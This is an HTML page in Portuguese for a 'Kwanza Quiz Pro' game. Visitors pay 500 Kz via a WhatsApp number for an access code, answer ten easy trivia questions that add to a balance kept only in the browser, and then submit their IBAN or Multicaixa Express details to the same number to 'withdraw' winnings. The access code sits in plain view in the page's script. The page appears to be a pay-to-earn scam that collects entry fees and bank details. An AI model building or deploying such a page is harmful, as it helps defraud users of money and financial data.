
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kwanza Quiz Pro | Jortencio Design</title>
    <style>
        body {
            margin: 0; padding: 0;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh;
            font-family: 'Segoe UI', Arial, sans-serif;
            background: url('https://images.unsplash.com/photo-1454165833767-027eece159a8?q=80&w=2070') no-repeat center center fixed;
            background-size: cover;
            color: white;
        }

        .container {
            background-color: rgba(0, 0, 0, 0.9);
            padding: 30px;
            border-radius: 25px;
            border: 2px solid #4CAF50;
            width: 90%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }

        .btn-green {
            background-color: #66cc66;
            color: white; border: none;
            padding: 15px; border-radius: 12px;
            font-size: 1.1rem; font-weight: bold;
            width: 100%; cursor: pointer;
            margin-bottom: 10px; text-decoration: none;
            display: block;
        }

        input[type="text"] {
            width: 100%; padding: 15px;
            margin: 10px 0; border: none;
            border-radius: 12px; font-size: 1rem;
            text-align: center; box-sizing: border-box;
        }

        #quiz-area, #saque-area { display: none; }
        .saldo-display { font-size: 1.5rem; color: #66cc66; margin: 15px 0; font-weight: bold; }
        .pergunta { font-size: 1.2rem; margin-bottom: 20px; }
    </style>
</head>
<body>

    <div class="container">
        <div id="payment-screen">
            <h1>Kwanza Quiz Pro</h1>
            <p>1. Pague **500 Kz** via WhatsApp.</p>
            <p>2. Use o seu **C√≥digo de Acesso**.</p>
            <a href="https://wa.me/244921447214" class="btn-green">Pagar via WhatsApp</a>
            <input type="text" id="access-code" placeholder="Insira o C√≥digo de Acesso">
            <button class="btn-green" style="background-color: #4c914c;" onclick="checkCode()">Entrar no Jogo</button>
        </div>

        <div id="quiz-area">
            <div class="saldo-display">Saldo: <span id="saldo-valor">0</span> Kz</div>
            <div id="quiz-container">
                <p id="pergunta-titulo" class="pergunta"></p>
                <div id="opcoes-box"></div>
            </div>
        </div>

        <div id="saque-area">
            <h2>Parab√©ns! üéâ</h2>
            <p>Seu saldo final: <span id="saldo-final">0</span> Kz</p>
            <p>Escolha o m√©todo de levantamento:</p>
            <button class="btn-green" onclick="escolherMetodo('IBAN')">Levantar via IBAN</button>
            <button class="btn-green" onclick="escolherMetodo('Multicaixa Express')">Levantar via Express</button>
            
            <div id="form-saque" style="display:none; margin-top:20px;">
                <input type="text" id="dados-saque" placeholder="Digite o IBAN ou N√∫mero">
                <button class="btn-green" style="background-color: #4c914c;" onclick="enviarPedido()">Pedir Saque ao CEO</button>
            </div>
        </div>
    </div>

    <script>
        const SENHA_CORRETA = "JORTENCIO2024";
        let saldo = 0;
        let perguntaAtual = 0;
        let metodoSelecionado = "";

        const perguntas = [
            {q: "Qual a capital da Fran√ßa?", a: ["Paris", "Lyon"], c: 0},
            {q: "Maior pa√≠s do mundo?", a: ["Brasil", "R√∫ssia"], c: 1},
            {q: "Quem pintou a Mona Lisa?", a: ["Da Vinci", "Picasso"], c: 0},
            {q: "Moeda oficial dos EUA?", a: ["Euro", "D√≥lar"], c: 1},
            {q: "Onde ficam as Pir√¢mides?", a: ["Egito", "M√©xico"], c: 0},
            {q: "Planeta conhecido como Vermelho?", a: ["Marte", "V√©nus"], c: 0},
            {q: "Quantos continentes existem?", a: ["5", "7"], c: 1},
            {q: "Oceano mais profundo?", a: ["√çndico", "Pac√≠fico"], c: 1},
            {q: "L√≠ngua oficial do Brasil?", a: ["Espanhol", "Portugu√™s"], c: 1},
            {q: "Animal mais r√°pido da terra?", a: ["Guepardo", "Le√£o"], c: 0}
        ];

        function checkCode() {
            let code = document.getElementById('access-code').value;
            if (code.toUpperCase() === SENHA_CORRETA) {
                document.getElementById('payment-screen').style.display = 'none';
                document.getElementById('quiz-area').style.display = 'block';
                showQuestion();
            } else { alert("C√≥digo inv√°lido!"); }
        }

        function showQuestion() {
            if (perguntaAtual < perguntas.length) {
                const item = perguntas[perguntaAtual];
                document.getElementById('pergunta-titulo').innerText = item.q;
                const box = document.getElementById('opcoes-box');
                box.innerHTML = "";
                item.a.forEach((opcao, index) => {
                    const btn = document.createElement('button');
                    btn.innerText = opcao; btn.className = "btn-green";
                    btn.onclick = () => {
                        if(index === item.c) {
                            saldo += 75;
                            document.getElementById('saldo-valor').innerText = saldo;
                        }
                        perguntaAtual++;
                        showQuestion();
                    };
                    box.appendChild(btn);
                });
            } else {
                document.getElementById('quiz-area').style.display = 'none';
                document.getElementById('saque-area').style.display = 'block';
                document.getElementById('saldo-final').innerText = saldo;
            }
        }

        function escolherMetodo(metodo) {
            metodoSelecionado = metodo;
            document.getElementById('form-saque').style.display = 'block';
            document.getElementById('dados-saque').placeholder = "Insira seu " + metodo;
        }

        function enviarPedido() {
            let dados = document.getElementById('dados-saque').value;
            if(dados === "") { alert("Preencha os dados!"); return; }
            
            // AQUI O SALDO √â ADICIONADO √Ä MENSAGEM
            let mensagem = `Ol√° CEO! Gostaria de pedir o saque do meu saldo.\n\n` +
                           `*Saldo:* ${saldo} Kz\n` +
                           `*M√©todo:* ${metodoSelecionado}\n` +
                           `*Dados:* ${dados}`;
            
            window.location.href = "https://wa.me/244921447214?text=" + encodeURIComponent(mensagem);
        }
    </script>
</body>
</html>
